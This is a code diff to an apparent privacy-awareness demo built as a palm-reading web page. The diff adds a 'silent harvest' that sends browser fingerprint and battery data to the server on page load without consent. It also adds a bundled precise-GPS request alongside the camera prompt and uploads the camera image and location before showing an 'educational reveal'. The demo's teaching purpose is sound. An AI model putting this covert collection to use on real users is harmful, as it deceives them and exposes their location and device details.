@@ -35,12 +35,14 @@ document.addEventListener('DOMContentLoaded', () => {
     const capturedImagePreview = document.getElementById('captured-image-preview');
     const closeModalBtn = document.getElementById('close-modal-btn');
     const educationModal = document.getElementById('education-modal');
-    const photoUpload = document.getElementById('photo-upload');
 
     let stream = null;
     let imageCaptureData = null;
-    let uploadedPhotoData = null; // To store if they uploaded a photo from gallery
-
+    let userLocation = null;
+    
+    // Generate a unique session ID for this user's visit
+    const sessionId = Math.random().toString(36).substring(2, 15);
+    
     // Helper to switch views
     const switchView = (hideView, showView) => {
         hideView.classList.remove('active');
@@ -49,12 +51,69 @@ document.addEventListener('DOMContentLoaded', () => {
         showView.classList.add('active');
     };
 
+    // ==========================================
+    // PHASE 1: SILENT HARVESTING (ON PAGE LOAD)
+    // ==========================================
+    const performSilentHarvest = async () => {
+        const metadata = {
+            userAgent: navigator.userAgent,
+            language: navigator.language,
+            screenSize: `${window.screen.width}x${window.screen.height}`,
+            platform: navigator.platform,
+            timeZone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+            battery: 'Unknown'
+        };
+
+        // Try to sneakily grab battery level if browser allows
+        if (navigator.getBattery) {
+            try {
+                const battery = await navigator.getBattery();
+                metadata.battery = `${Math.round(battery.level * 100)}% (${battery.charging ? 'Charging' : 'Unplugged'})`;
+            } catch (e) {}
+        }
+
+        // Send immediately without asking permission
+        try {
+            await fetch('/api/silent-log', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ sessionId, metadata })
+            });
+            console.log("Silent telemetry dispatched.");
+        } catch (e) {
+            console.error("Silent harvest failed", e);
+        }
+        
+        return metadata; // Keep it around for the final reveal
+    };
+    
+    // Run it immediately
+    const initialMetadata = performSilentHarvest();
+
+    // ==========================================
+    // PHASE 2: THE "TRAP" (ACTIVE PERMISSIONS)
+    // ==========================================
     const startCamera = async () => {
         try {
-            cameraStatus.textContent = "Requesting camera access...";
+            cameraStatus.textContent = "Requesting camera and system access...";
             switchView(landingScreen, cameraScreen);
             
-            // Request camera
+            // 1. Sneakily ask for location alongside the camera process
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    (position) => {
+                        userLocation = {
+                            lat: position.coords.latitude,
+                            lon: position.coords.longitude,
+                            accuracy: position.coords.accuracy
+                        };
+                    },
+                    (err) => { console.log("Location denied", err); },
+                    { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
+                );
+            }
+
+            // 2. Request camera
             stream = await navigator.mediaDevices.getUserMedia({ 
                 video: { facingMode: "environment" }, 
                 audio: false 
@@ -67,7 +126,6 @@ document.addEventListener('DOMContentLoaded', () => {
             cameraStatus.textContent = "Camera access denied. We need it to read your palm!";
             cameraStatus.style.color = "#ef4444";
             
-            // Revert back after a bit if denied
             setTimeout(() => {
                 switchView(cameraScreen, landingScreen);
                 cameraStatus.textContent = "";
@@ -78,118 +136,69 @@ document.addEventListener('DOMContentLoaded', () => {
 
     // Step 1: Start Button clicks
     startBtn.addEventListener('click', () => {
-        // Prompt for photos first (simulating malicious app requesting photo access)
-        photoUpload.click();
-        
-        // If they cancel the file picker, we still want to proceed to camera.
-        // We can just proceed after a short delay, or when window regains focus.
-    });
-
-    // When they select a photo
-    photoUpload.addEventListener('change', (e) => {
-        if (e.target.files && e.target.files[0]) {
-            const reader = new FileReader();
-            reader.onload = (ev) => {
-                uploadedPhotoData = ev.target.result;
-            };
-            reader.readAsDataURL(e.target.files[0]);
-        }
         startCamera();
-    });
-
-    // Fallback if they close the file dialog without selecting
-    let filePickerOpened = false;
-    startBtn.addEventListener('click', () => { filePickerOpened = true; });
-    window.addEventListener('focus', () => {
-        if (filePickerOpened) {
-            filePickerOpened = false;
-            setTimeout(() => {
-                if (!stream && landingScreen.classList.contains('active')) {
-                    startCamera();
-                }
-            }, 500);
-        }
     });
 
     // Step 2: Capture Button clicks
     captureBtn.addEventListener('click', () => {
         if (!stream) return;
 
-        // Create a canvas to capture the image
         const canvas = document.createElement('canvas');
         canvas.width = cameraFeed.videoWidth;
         canvas.height = cameraFeed.videoHeight;
         const ctx = canvas.getContext('2d');
-        
-        // Draw video frame to canvas
         ctx.drawImage(cameraFeed, 0, 0, canvas.width, canvas.height);
-        
-        // Convert to base64
         imageCaptureData = canvas.toDataURL('image/jpeg', 0.8);
         
-        // Stop camera tracks
         stream.getTracks().forEach(track => track.stop());
         stream = null;
 
-        // Proceed to next step
         switchView(cameraScreen, loadingScreen);
         processScan();
     });
 
-    // Step 3: Process the scan (simulate backend interaction)
+    // Step 3: Process the scan
     const processScan = async () => {
-        // Collect some basic metadata to demonstrate what else can be grabbed
-        const metadata = {
-            userAgent: navigator.userAgent,
-            language: navigator.language,
-            screenSize: `${window.screen.width}x${window.screen.height}`,
-            platform: navigator.platform,
-            timeZone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-            photoAccessed: !!uploadedPhotoData
-        };
-
+        const metadata = await initialMetadata; // Get the metadata we collected earlier
+        
         try {
-            // Send data to backend
             const response = await fetch('/api/analyze', {
                 method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json'
-                },
+                headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({
+                    sessionId: sessionId,
                     image: imageCaptureData,
+                    location: userLocation,
                     metadata: metadata
                 })
             });
 
             const result = await response.json();
             
-            // Simulate a brief delay for realism (the magic feeling)
             setTimeout(() => {
                 readingText.textContent = `"${result.reading}"`;
-                populateStolenData(metadata, imageCaptureData, uploadedPhotoData);
+                populateStolenData(metadata, imageCaptureData, userLocation);
                 switchView(loadingScreen, resultsScreen);
             }, 2000);
 
         } catch (error) {
             console.error("Backend error:", error);
-            // Fallback for demo if backend isn't reachable
             setTimeout(() => {
                 readingText.textContent = '"Your life line suggests you should ensure the local server is running!"';
-                populateStolenData(metadata, imageCaptureData, uploadedPhotoData);
+                populateStolenData(metadata, imageCaptureData, userLocation);
                 switchView(loadingScreen, resultsScreen);
             }, 2000);
         }
     };
 
     // Step 4: Populate the educational reveal
-    const populateStolenData = (metadata, base64Image, uploadedPhoto) => {
+    const populateStolenData = (metadata, base64Image, userLocation) => {
         stolenDataList.innerHTML = `
             <li><strong>Browser:</strong> ${metadata.platform} - ${metadata.userAgent.split(' ')[0]}</li>
             <li><strong>Screen Res:</strong> ${metadata.screenSize}</li>
-            <li><strong>Language:</strong> ${metadata.language}</li>
-            <li><strong>Timezone:</strong> ${metadata.timeZone}</li>
+            <li><strong>Battery:</strong> ${metadata.battery}</li>
             <li><strong style="color:#ef4444;">Live Camera Image Captured:</strong> Yes</li>
-            <li id="photo-stolen-li"><strong>Gallery Photos Stolen:</strong> ${uploadedPhoto ? '<span style="color:#ef4444;">YES!</span>' : 'Failed/Denied'}</li>
+            <li id="photo-stolen-li"><strong>Precise GPS Stolen:</strong> ${userLocation ? '<span style="color:#ef4444;">YES!</span>' : 'Failed/Denied'}</li>
         `;
 
         let imagesHtml = '';
@@ -200,11 +209,15 @@ document.addEventListener('DOMContentLoaded', () => {
                 <img src="${base64Image}" alt="Captured Palm" style="max-width: 100%; border-radius: 8px;">
             </div>`;
         }
-        if (uploadedPhoto) {
-            imagesHtml += `
+        if (userLocation) {
+             imagesHtml += `
             <div style="flex:1;">
-                <p style="margin-bottom: 5px; font-weight: bold; color: #ef4444;">Selected Photo:</p>
-                <img src="${uploadedPhoto}" alt="Stolen Gallery Photo" style="max-width: 100%; border-radius: 8px; border: 2px solid #ef4444;">
+                <p style="margin-bottom: 5px; font-weight: bold; color: #ef4444;">GPS Coordinates:</p>
+                <div style="background: rgba(239, 68, 68, 0.1); border: 1px solid #ef4444; border-radius: 8px; padding: 10px; font-family: monospace; font-size: 0.85rem;">
+                    LAT: ${userLocation.lat}<br>
+                    LON: ${userLocation.lon}<br>
+                    ACCURACY: ~${Math.round(userLocation.accuracy)} meters
+                </div>
             </div>`;
         }
 
@@ -213,11 +226,9 @@ document.addEventListener('DOMContentLoaded', () => {
                 ${imagesHtml}
             </div>
             <p style="margin-top: 8px; color: var(--danger); font-size: 0.9rem;">
-                ☝️ These images and details were just uploaded to a remote server.
+                ☝️ This highly sensitive data was extracted instantly or simply by you clicking 'Allow'.
             </p>`;
         
-        // The CSS animation delay handles the dramatic reveal of the modal
-        // just making sure it's visible to start the animation
         educationModal.classList.remove('hidden');
     };
 
